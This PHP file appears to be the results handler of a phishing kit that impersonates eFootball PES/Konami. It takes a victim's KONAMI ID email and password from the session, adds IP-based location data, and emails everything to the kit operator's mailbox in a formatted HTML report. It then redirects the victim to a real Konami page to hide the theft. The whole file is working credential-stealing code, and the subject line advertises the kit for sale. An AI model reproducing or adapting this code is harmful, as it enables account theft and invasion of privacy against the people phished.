<?php 
session_start();

if(!isset($_SESSION['userId']) || !isset($_SESSION['password'])) {
    header('location: ./');
} else {
    include 'idhaamdev.php';

    $userId   = $_SESSION['userId'];
    $password = $_SESSION['password'];

    $country  = $khcodes['country'];
    $region   = $khcodes['regionName'];
    $city     = $khcodes['city'];
    $lat      = $khcodes['lat'];
    $long     = $khcodes['lon'];
    $timezone = $khcodes['timezone'];
    $ipAddr   = $khcodes['query'];

    include 'email.php';
    $subjek = " KY xD  | Beli web Di Ky Maulana $userId";
    $pesan = <<<EOD
	<!DOCTYPE html>
	<html>
	<head>
		<title></title>
		<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
		<style type="text/css">
			body {
				font-family: "Helvetica";
				width: 90%;
				display: block;
				margin: auto;
				border: 1px solid #fff;
				background: #fff;
			}

			.result {
				width: 100%;
				height: 100%;
				display: block;
				margin: auto;
				position: fixed;
				top: 0;
				right: 0;
				left: 0;
				bottom: 0;
				z-index: 999;
				overflow-y: scroll;
			}

			.tblResult {
				width: 100%;
				display: table;
				margin: 0px auto;
				border-collapse: collapse;
				text-align: center;
				background: rgba(255,206,19, 0.1);
			}

			.tblResult th {
				text-align: left;
				font-size: 0.75em;
				margin: auto;
				padding: 15px 10px;
				background: #ffce13;
				border: 2px solid #ffce13;
				color: #0B0B0B;
			}

			.tblResult td {
				font-size: 0.75em;
				margin: auto;
				padding: 10px;
				border: 2px solid #ffce13;
				text-align: left;
				font-weight: bold;
				color: #0B0B0B;
				text-shadow: 0px 0px 10px #fff;

			}

			.tblResult th img {
				width: 45px;
				display: block;
				margin: auto;
				border-radius: 50%;
				box-shadow: 0px 0px 10px rgba(0,0,0, 0.5);
			}
		</style>
	</head>
	<body>
		<div class="result">
			<table class="tblResult">
				<tr>
					<th style="text-align: center;" colspan="3">Informasi Akun PES</th>
				</tr>
				<tr>
					<td style="border-right: none;">KONAMI ID (Email Address)</td>
					<td style="text-align: right;">$userId</td>
				</tr>
				<tr>
					<td style="border-right: none;">Password Akun</td>
					<td style="text-align: right;">$password</td>
				</tr>
				<tr>
					<th style="text-align: center;" colspan="3">Informasi Device</th>
				</tr>
				<tr>
					<td style="border-right: none;">Country</td>
					<td style="text-align: right;">$country</td>
				</tr>
				<tr>
					<td style="border-right: none;">Region</td>
					<td style="text-align: right;">$region</td>
				</tr>
				<tr>
					<td style="border-right: none;">City</td>
					<td style="text-align: right;">$city</td>
				</tr>
				<tr>
					<td style="border-right: none;">Latitude</td>
					<td style="text-align: right;">$lat</td>
				</tr>
				<tr>
					<td style="border-right: none;">Longitude</td>
					<td style="text-align: right;">$long</td>
				</tr>
				<tr>
					<td style="border-right: none;">IP Address</td>
					<td style="text-align: right;">$ipAddr</td>
				</tr>
				<tr>
					<th style="text-align: center;" colspan="3">2020 &copy; IdhaamDev</th>
				</tr>
			</table>
		</div>
	</body>
	</html>
EOD;
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= 'From: [ '.$resultFlags.' ] eFootball PES <result@idhaam69.dev>' . "\r\n";
$kirim = mail($emailku, $subjek, $pesan, $headers);

if($kirim) {
    header('location: https://www.konami.com/wepes/2020/eu/en/ps4/topic/game-wepes2020-7300');
}
}
?>